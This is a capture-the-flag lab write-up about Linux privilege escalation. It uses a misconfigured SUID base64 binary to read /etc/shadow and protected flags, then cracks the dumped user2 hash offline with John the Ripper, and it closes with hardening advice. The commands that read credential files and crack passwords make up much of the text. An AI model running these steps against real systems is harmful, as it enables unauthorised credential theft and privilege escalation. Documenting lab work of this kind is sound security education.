# 🛡️ Lab 05: SUID Privilege Escalation & Offline Hash Cracking

| Platform | Category | Difficulty | Status |
|---|---|---|---|
| Linux / TryHackMe | Privilege Escalation | Easy / Medium | ✅ Completed |

---

## 🎯 Goal
Escalate privileges and extract sensitive system data from an unprivileged session (`karen` / UID 1001) by auditing binaries with anomalous SUID flags, leveraging an improper configuration on `/usr/bin/base64` for arbitrary file read, and cracking intercepted SHA-512 crypt user hashes using John the Ripper.

---

## 🧠 Concept & Architecture

### The SUID (Set User ID) Primitive
In Linux, standard binary execution runs under the permissions of the calling user (Real UID). The SUID bit (`4000`) alters this security boundary:
* When an executable with SUID is launched, the process adopts the **Effective UID (EUID)** of the file owner (typically `root` / UID 0) for the duration of execution.
* Legitimate system binaries (e.g., `/usr/bin/passwd`) use SUID to perform administrative tasks (writing to `/etc/shadow`) on behalf of standard users.

```text
Standard Binary:  -rwxr-xr-x (Runs as caller)
SUID Binary:      -rwsr-xr-x (Runs as file owner - Root)
                     ▲
```

### The Arbitrary File Read Vector
SUID vulnerabilities do not always yield an immediate interactive root shell. When administrators assign SUID permissions to text utilities, encoders, or file parsers (such as `base64`, `cat`, or `curl`):
1. The binary can traverse and read protected files regardless of filesystem ACLs.
2. Attackers can dump restricted configuration files, administrative private keys (`/root/.ssh/id_rsa`), and the system authentication database (`/etc/shadow`).

---

## 🔍 Enumeration

### 1. User & Identity Discovery
Enumerate user accounts configured on the host to establish lateral movement targets:

```bash
cat /etc/passwd | cut -d: -f1
```

*Key findings:* Identified standard service accounts along with user `gerryconway` (comic book author reference) and standard lateral account `user2`.

### 2. SUID Binary Auditing
Scan the entire filesystem for files with the SUID bit set, discarding permission errors:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

*Example output:*
```text
 1507     44 -rwsr-xr-x   1 root  root   44784 May 28  2020 /usr/bin/newgrp
 1857     52 -rwsr-xr-x   1 root  root   53040 May 28  2020 /usr/bin/chsh
 1722     44 -rwsr-xr-x   1 root  root   43352 Sep  5  2019 /usr/bin/base64
 1674     68 -rwsr-xr-x   1 root  root   67816 Jul 21  2020 /usr/bin/su
 1633     56 -rwsr-xr-x   1 root  root   55528 Jul 21  2020 /usr/bin/mount
```

> **Evaluation:** While `su`, `mount`, and `chsh` are expected system utilities, `/usr/bin/base64` is an anomaly. An encoder does not require administrative elevation to function; having SUID enables unrestricted system file disclosures.

---

## 💥 Exploitation Workflow

```
[Target: Low-Priv Shell (karen)]
        │
        ├── 1. Run SUID search -> Discovered /usr/bin/base64 with SUID
        │
        ├── 2. Abuse base64 to read /etc/shadow
        │       └── Dumped password hash for user2 ($6$m6VmzKTbzCD...)
        │
        ├── 3. Transfer hash to Attack Machine -> Format with Heredoc
        │       └── Cracked via John the Ripper (rockyou.txt): "Password1"
        │
        └── 4. Locate and exfiltrate flag3.txt via base64 pipeline
```

### Step 1: Read Protected Shadow Database
Utilize the SUID capability of `base64` to encode `/etc/shadow` (bypassing normal read restrictions), then pipe the output back to decode it directly in stdout:

```bash
base64 /etc/shadow | base64 --decode
```

*Extracted hash for `user2`:*
```text
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
```

### Step 2: Offline Hash Cracking
Transfer the raw shadow line to the attack machine. Because the `$6$` designator represents SHA-512 crypt with salts, standard echo commands with double quotes will corrupt the hash through variable expansion. Use single quotes or a Heredoc:

```bash
cat << 'EOF' > user2_clean.txt
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
EOF
```

Execute dictionary attack against the harvested hash using John the Ripper and `rockyou.txt`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt user2_clean.txt
```

*Example execution output:*
```text
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Password1        (user2)     
1g 0:00:00:07 DONE (2026-11-19 20:27) 0.1252g/s 448.6p/s
```

*Verification:*
```bash
john --show user2_clean.txt
# user2:Password1:18796:0:99999:7:::
```

### Step 3: Flag Recovery
Locate and extract `flag3.txt` using the arbitrary read vector:

```bash
find / -name "flag3*" 2>/dev/null
base64 /home/ubuntu/flag3.txt | base64 --decode
```

---

## 🧬 Root Cause Analysis

1. **Inappropriate SUID Assignment:** Assigning `4000` to non-administrative utilities converts generic file access tools into arbitrary read primitives.
2. **Weak Password Policy:** Even with strong cryptographic hashing (SHA-512 crypt with unique salts), the credential (`Password1`) was compromised in seconds because it exists within common dictionary sets.
3. **Missing Filesystem Boundaries:** Temporary workspaces and user directories were mounted without `nosuid`, permitting arbitrary execution contexts.

---

## 🛡️ Remediation & Hardening

| Layer | Defense Mechanism | Implementation |
|---|---|---|
| **Binary Hardening** | Strip anomalous SUID flags | `sudo chmod u-s /usr/bin/base64` |
| **Password Hygiene** | Enforce strong PAM complexity | Configure `/etc/security/pwquality.conf` with `minlen = 14`, `dcredit = -1`, `ucredit = -1`. |
| **Filesystem Isolation** | Mount partitions with `nosuid` | Ensure `/home`, `/tmp`, and `/dev/shm` feature `nosuid` in `/etc/fstab`. |
| **Integrity Monitoring** | Detect unauthorized SUID changes | Deploy File Integrity Monitoring (FIM / AIDE / Tripwire) targeting `/usr/bin` and `/bin`. |

---

## 📝 My Lab Notes

* **The Shell Escaping Lesson:** Passing hashes containing `$` characters inside double quotes (`""`) silently strips sections of the hash due to Bash variable evaluation. Always use single quotes (`''`) or Heredocs (`<< 'EOF'`) when handling raw cryptographic hashes.
* **Architecture Distinction:** Cracking tools (`john`, `hashcat`) and massive wordlists (`rockyou.txt`) belong on the attack machine, not the target node. Extract the artifact, exfiltrate it, and crack offline.
* **The SUID Reality:** SUID binaries don't need to spawn `/bin/sh` to be critical. Reading `/etc/shadow` gives offline access to all system credentials.

---

## 💡 Key Takeaways

1. **Distinguish system vs suspicious binaries:** Standard SUID binaries (`passwd`, `mount`) are expected; utility binaries (`base64`, `cp`, `find`) indicate misconfiguration.
2. **Hashing does not prevent dictionary attacks:** High-iteration hashes like SHA-512 crypt are useless against weak passwords present in public dictionaries.
3. **Arbitrary file read is a full system compromise:** Access to `/etc/shadow` or private SSH keys is functionally equivalent to administrative access.
4. **Environment hygiene matters:** Always preserve hash integrity during transfer to avoid corrupting input formats during offline auditing.

---

⬅️ [Previous: Sudo Abuse](./04-sudo-abuse.md) | [Back to Labs](../README.md) | ➡️ [Next: Capabilities](./06-capabilities.md)
